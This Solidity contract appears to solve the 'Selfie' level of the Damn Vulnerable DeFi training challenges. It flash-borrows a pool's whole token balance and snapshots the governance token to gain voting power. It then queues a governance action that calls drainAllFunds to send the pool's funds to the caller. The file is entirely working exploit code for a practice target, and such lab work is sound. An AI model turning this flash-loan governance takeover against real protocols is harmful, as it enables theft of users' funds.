// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
contract SelfieAttacker {
	SelfiePool selfiePool;
	SimpleGovernance simpleGovernance;

	constructor (address selfiePoolAddress, address simpleGovernanceAddress) {
		selfiePool = SelfiePool(selfiePoolAddress);
		simpleGovernance = SimpleGovernance(simpleGovernanceAddress);
	}
	function attack() external{
		uint256 amount = selfiePool.token().balanceOf(address(selfiePool));
		selfiePool.flashLoan(amount);
		simpleGovernance.queueAction(
			address(selfiePool), 
			abi.encodeWithSignature("drainAllFunds(address)", msg.sender), 
			0);
	}

	function receiveTokens(address token, uint256 amount) external {
		DamnValuableTokenSnapshot(token).snapshot();
		DamnValuableTokenSnapshot(token).transfer(msg.sender, amount);
	}
}